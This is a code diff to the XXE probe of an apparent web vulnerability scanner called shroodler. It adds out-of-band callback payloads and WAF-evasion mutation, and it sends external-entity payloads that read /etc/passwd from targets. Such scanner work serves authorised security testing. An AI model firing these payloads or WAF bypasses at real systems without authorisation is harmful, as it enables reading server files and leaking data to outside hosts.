@@ -8,6 +8,7 @@ from collections.abc import Callable
 import httpx
 
 from shroodler.models import Finding
+from shroodler.oob import collaborator_of, confirm_oob
 from shroodler.pacer import Pacer
 from shroodler.probes.common import (
     body_text,
@@ -17,12 +18,12 @@ from shroodler.probes.common import (
     url_without_query,
 )
 from shroodler.probes.ssrf import _default_listen
-
-# TODO: apply shroodler.waf_detect.mutate_payload when state.waf_detected.
+from shroodler.waf_detect import expand_if_waf
 
 ListenFn = Callable[[float], tuple[int, Callable[[], bool]]]
 
 _XML_REJECTED = {400, 415}
+_COLLAB_WAIT = 3.0
 _FILE_MARKERS = ("root:x:0:0", "daemon:")
 _FILE_PARAM_HINTS = (
     "file",
@@ -60,6 +61,19 @@ def _oob_xml(port: int, nonce: str) -> str:
 
 def _file_xml() -> str:
     return '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+
+
+def _collab_xml(callback_url: str) -> tuple[str, ...]:
+    return (
+        (
+            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{callback_url}">]>'
+            "<root>&xxe;</root>"
+        ),
+        (
+            f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback_url}">%xxe;]>'
+            "<foo/>"
+        ),
+    )
 
 
 def _finding(
@@ -134,6 +148,10 @@ def probe_xxe(
     listen_fn: ListenFn | None = None,
     oob_timeout: float = 5.0,
     content_type: str = "",
+    state=None,
+    waf_detected: bool = False,
+    waf_vendor: str | None = None,
+    oob=None,
 ) -> list[Finding]:
     """POST XXE payloads at XML (or unknown-CT POST) endpoints and XML uploads."""
     method_u = (method or "GET").upper()
@@ -149,6 +167,14 @@ def probe_xxe(
     findings: list[Finding] = []
     listen = listen_fn or _default_listen
     nonce = secrets.token_hex(8)
+    collab = collaborator_of(oob, state)
+    file_payloads = expand_if_waf(
+        (_file_xml(),),
+        state=state,
+        waf_detected=waf_detected,
+        waf_vendor=waf_vendor,
+    )
+    wait = min(_COLLAB_WAIT, oob_timeout or _COLLAB_WAIT)
 
     def _oob(send) -> bool:
         try:
@@ -157,6 +183,48 @@ def probe_xxe(
             return bool(wait_for_hit())
         except Exception:  # noqa: BLE001 - fail closed
             return False
+
+    def _collab_hit(send, *, field: str = "") -> bool:
+        if collab is None:
+            return False
+        try:
+            minted = collab.mint("xxe")
+            for xml in expand_if_waf(
+                _collab_xml(minted.url),
+                state=state,
+                waf_detected=waf_detected,
+                waf_vendor=waf_vendor,
+            ):
+                send(xml)
+            hit = confirm_oob(collab, minted.token, timeout=wait)
+        except Exception:  # noqa: BLE001 - fail closed
+            return False
+        if hit is None:
+            return False
+        if field:
+            description = (
+                f"Multipart field {field!r} fetched an OOB callback via an "
+                "external entity (XXE)."
+            )
+            evidence_prefix = f"param={field} "
+        else:
+            description = (
+                "XML body fetched an OOB callback via an external entity (XXE)."
+            )
+            evidence_prefix = ""
+        findings.append(
+            _finding(
+                finding_id="xxe-oob",
+                url=url,
+                description=description,
+                evidence=(
+                    f"{evidence_prefix}payload=oob token={minted.token} "
+                    f"url={minted.url} remote={hit.remote} method={hit.method} "
+                    f"path={hit.path}"
+                ),
+            )
+        )
+        return True
 
     if try_xml_body:
         oob_resp: httpx.Response | None = None
@@ -176,17 +244,23 @@ def probe_xxe(
                     evidence=f"payload=oob nonce={nonce}",
                 )
             )
+        elif _collab_hit(_send_xml):
+            pass
         elif int(getattr(oob_resp, "status_code", 0) or 0) not in _XML_REJECTED:
-            file_resp = _post_xml(url, _file_xml(), cookie_header, client=client, pacer=pacer)
-            if _body_has_passwd(body_text(file_resp)):
-                findings.append(
-                    _finding(
-                        finding_id="xxe-file-read",
-                        url=url,
-                        description=("XML entity expansion returned a local file marker (XXE)."),
-                        evidence="payload=file:///etc/passwd",
+            for xml in file_payloads:
+                file_resp = _post_xml(url, xml, cookie_header, client=client, pacer=pacer)
+                if _body_has_passwd(body_text(file_resp)):
+                    findings.append(
+                        _finding(
+                            finding_id="xxe-file-read",
+                            url=url,
+                            description=(
+                                "XML entity expansion returned a local file marker (XXE)."
+                            ),
+                            evidence="payload=file:///etc/passwd",
+                        )
                     )
-                )
+                    break
 
     if try_upload:
         for item in file_params:
@@ -208,29 +282,41 @@ def probe_xxe(
                     )
                 )
                 break
-            file_resp = _post_multipart(
-                url,
-                name,
-                _file_xml(),
-                cookie_header,
-                client=client,
-                pacer=pacer,
-            )
-            status = int(getattr(file_resp, "status_code", 0) or 0)
-            if status in _XML_REJECTED:
-                continue
-            if _body_has_passwd(body_text(file_resp)):
-                findings.append(
-                    _finding(
-                        finding_id="xxe-file-read",
-                        url=url,
-                        description=(
-                            f"Multipart field {name!r} returned a local file "
-                            "marker after an XXE payload."
-                        ),
-                        evidence=f"param={name} payload=file:///etc/passwd",
-                    )
+            if _collab_hit(
+                lambda xml, field=name: _post_multipart(
+                    url, field, xml, cookie_header, client=client, pacer=pacer
+                ),
+                field=name,
+            ):
+                break
+            file_hit = False
+            for xml in file_payloads:
+                file_resp = _post_multipart(
+                    url,
+                    name,
+                    xml,
+                    cookie_header,
+                    client=client,
+                    pacer=pacer,
                 )
+                status = int(getattr(file_resp, "status_code", 0) or 0)
+                if status in _XML_REJECTED:
+                    continue
+                if _body_has_passwd(body_text(file_resp)):
+                    findings.append(
+                        _finding(
+                            finding_id="xxe-file-read",
+                            url=url,
+                            description=(
+                                f"Multipart field {name!r} returned a local file "
+                                "marker after an XXE payload."
+                            ),
+                            evidence=f"param={name} payload=file:///etc/passwd",
+                        )
+                    )
+                    file_hit = True
+                    break
+            if file_hit:
                 break
 
     return dedupe(findings)
